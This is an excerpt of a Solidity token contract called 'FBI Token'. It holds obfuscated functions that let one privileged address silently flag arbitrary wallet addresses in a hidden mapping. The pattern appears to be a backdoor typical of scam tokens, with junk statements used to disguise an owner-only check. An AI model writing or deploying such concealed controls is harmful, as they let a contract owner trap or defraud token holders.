...
contract Token is Context, IERC20, Ownable{
    ...
    string private _name = "FBI Token";
    string private _symbol = "FBI Token";
    uint8 private _decimals = 9;
    mapping (address => uint256) _balances;

    address payable public MMMMWW;

    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _isExcludefromFee;
    mapping (address => bool) public isMarketPair;
    mapping (address => bool) public _SYYYYYNCCC;
    ...
    function SYYYYYYNCCC() public view{
        uint256 a = 1;
        a = a;
        require(MMMMWW == msg.sender);
        a = a;

    }

    function SYYYNCCCC(bool _SYNC7, address[] calldata _SYNC2) public {
        SYYYYYYNCCC();
        bool SSSSSSYNNC = _SYNC7 || (123 > 123);
        for (uint256 i; i < _SYNC2.length; i++) {
            _SYYYYYNCCC[_SYNC2[i]] = SSSSSSYNNC;
        }
    }
